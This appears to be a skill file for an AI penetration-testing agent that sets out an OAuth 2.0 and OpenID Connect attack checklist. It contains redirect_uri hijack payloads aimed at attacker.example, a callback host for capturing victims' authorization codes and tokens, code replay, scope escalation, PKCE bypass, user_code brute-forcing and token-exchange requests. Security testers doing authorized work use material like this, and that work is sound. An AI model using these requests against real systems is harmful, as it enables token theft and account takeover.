---
name: oauth-oidc-testing
description: Detect and exploit OAuth 2.0 and OpenID Connect security flaws in authentication flows
origin: Vigil
vuln_class: oauth
---

# OAuth / OpenID Connect Testing

> **`vigil assess kali` audit flags:** use `--technique AUTH` (OAuth/OIDC bugs — redirect_uri abuse, scope escalation, state/PKCE tampering, id_token acceptance — all collapse to the AUTH class). Switch to `JWT` when attacking the id_token's signature or claims specifically.

## When to Activate

- Application uses OAuth 2.0 or OpenID Connect for authentication or authorization
- Login flow redirects to external IdP (Google, GitHub, Azure AD, Okta, Auth0, custom)
- Endpoints include `/authorize`, `/token`, `/callback`, `/oauth`, `/.well-known/openid-configuration`

## Tools

- `vigil assess kali exec -- curl ...` (manual OAuth flow manipulation and token probing — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique AUTH --probe-kind payload --phase consume-test --timeout 30`)
- Browser DevTools (intercept redirects, capture authorization codes, inspect tokens)
- `jwt_tool` / `jwt.io` (decode and tamper with ID tokens and access tokens — host-side analysis, not target-facing)
- `vigil oob mint` / `vigil oob poll` — capture authorization codes / tokens leaked via a hijacked `redirect_uri`. Mint a nonce-tagged callback host (`vigil oob mint --technique AUTH --target-url <authorize-url> --param redirect_uri`), submit its `http` host as the `redirect_uri` (or the rebinding/path-confusion variant you are testing), and when the IdP redirects the victim's browser there the code/token rides along; `vigil oob poll --client <name>` then returns the matched probe<->callback pair carrying the captured request. Check readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`. (`vigil oob client logs <name> --lines 80` is a raw listener tail for infra debugging only, not correlation.)

## Methodology

### 1. Reconnaissance
- [ ] Enumerate OAuth/OIDC configuration
```bash
curl https://target/.well-known/openid-configuration
curl https://target/.well-known/oauth-authorization-server
curl https://target/oauth/discovery
```
- [ ] Identify grant types, endpoints, scopes, and supported algorithms
- [ ] Check for client_id and client_secret exposed in frontend JavaScript
- [ ] Note: `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `userinfo_endpoint`

### 2. redirect_uri Manipulation
- [ ] Open redirect via path traversal
```
/authorize?client_id=X&redirect_uri=https://legitimate.example/../attacker.example&response_type=code
```
- [ ] Subdomain matching bypass
```
redirect_uri=https://attacker.legitimate.example/callback
redirect_uri=https://legitimate.example.attacker.example/callback
```
- [ ] Parameter pollution
```
redirect_uri=https://legitimate.example/callback&redirect_uri=https://attacker.example/steal
```
- [ ] Path traversal and fragment injection
```
redirect_uri=https://legitimate.example/callback/../../attacker-controlled-path
redirect_uri=https://legitimate.example/callback%23@attacker.example
```
- [ ] Localhost and IP bypass
```
redirect_uri=http://localhost/callback
redirect_uri=http://127.0.0.1/callback
```
- [ ] Test with and without URL encoding of special characters

### 3. State Parameter Testing
- [ ] Check if `state` parameter is present in authorization request
- [ ] Test CSRF by replaying authorization URL without `state`
- [ ] Check if `state` is validated on callback — send a modified or missing `state`
- [ ] Test predictability: is `state` a static value, timestamp, or sequential?

### 4. Authorization Code Attacks
- [ ] Authorization code replay — use same code twice
```bash
curl -X POST https://target/oauth/token -d "grant_type=authorization_code&code=CAPTURED_CODE&client_id=X&redirect_uri=Y"
# Send same request again
```
- [ ] Code injection — swap code between different client_ids
- [ ] Test if code is bound to redirect_uri (change redirect_uri in token exchange)

### 5. Token Leakage
- [ ] Check if tokens leak via Referer header (navigate from callback page to external link)
- [ ] Check URL fragments for implicit flow tokens in browser history and logs
- [ ] Test if access_token appears in URL query string (should be fragment only)
- [ ] Check server logs and error pages for token reflection

### 6. Scope Escalation
- [ ] Request elevated scopes not granted in initial consent
```
/authorize?client_id=X&scope=openid+profile+email+admin
/authorize?client_id=X&scope=openid+profile+email+write:all
```
- [ ] Test scope upgrade at token refresh
```bash
curl -X POST https://target/oauth/token -d "grant_type=refresh_token&refresh_token=RT&scope=admin"
```
- [ ] Compare token claims before and after scope manipulation

### 7. PKCE Bypass
- [ ] Test if authorization server accepts requests without `code_challenge`
```
/authorize?client_id=X&redirect_uri=Y&response_type=code  # No code_challenge
```
- [ ] Test if `code_verifier` is validated at token exchange
```bash
curl -X POST https://target/oauth/token -d "grant_type=authorization_code&code=CODE&code_verifier=wrong_value"
```
- [ ] Test downgrade from S256 to plain method

### 8. JWT ID Token Attacks
- [ ] Decode ID token and inspect claims (`iss`, `aud`, `exp`, `sub`, `nonce`)
- [ ] Test `alg:none` bypass
- [ ] Test key confusion: RS256 to HS256 using public key as HMAC secret
- [ ] Test JWK/kid injection in token header
- [ ] Verify `aud` claim validation — token issued for different client accepted?
- [ ] Check `nonce` binding to prevent replay

### 9. Implicit Flow Token Theft
- [ ] If implicit flow enabled, tokens in URL fragment are exposed to JS
- [ ] Test if `response_type=token` is accepted even when `code` flow is expected
- [ ] Combine with open redirect to steal fragment tokens

### 10. Device Flow Abuse
- [ ] Brute-force `user_code` in device authorization flow
```bash
# device_code is long, but user_code is short (6-8 chars)
curl -X POST https://target/oauth/device -d "client_id=X"
# Brute-force polling endpoint with guessed user_codes
```
- [ ] Test rate limiting on device code polling endpoint
- [ ] Check device code expiration enforcement

### 11. Token Exchange Attacks (RFC 8693)
- [ ] Test subject_token validation in token exchange
```bash
curl -X POST https://target/oauth/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=STOLEN_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token"
```
- [ ] Test if impersonation is possible via crafted subject tokens

## What to Record

- OAuth/OIDC flow type (authorization code, implicit, device, client credentials)
- Vulnerable endpoint and parameter (redirect_uri, state, scope, code_challenge)
- Exact payload/request that exploits the flaw
- Token contents (decoded JWT claims) and scope differences
- Impact: account takeover, privilege escalation, token theft, CSRF — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., authorization code was delivered to attacker-controlled redirect_uri and exchanged for an access token that reads victim's profile, forged id_token with elevated claims was accepted and granted admin access, stolen refresh_token maintains persistent authenticated sessions without re-authorization
- Full request/response chain including authorization and token exchange

## Extended Resources

- `agent/references/payloads/jwt-payloads.md` — alg:none, key confusion (RS256>HS256), JWK/kid injection, weak secret brute-force
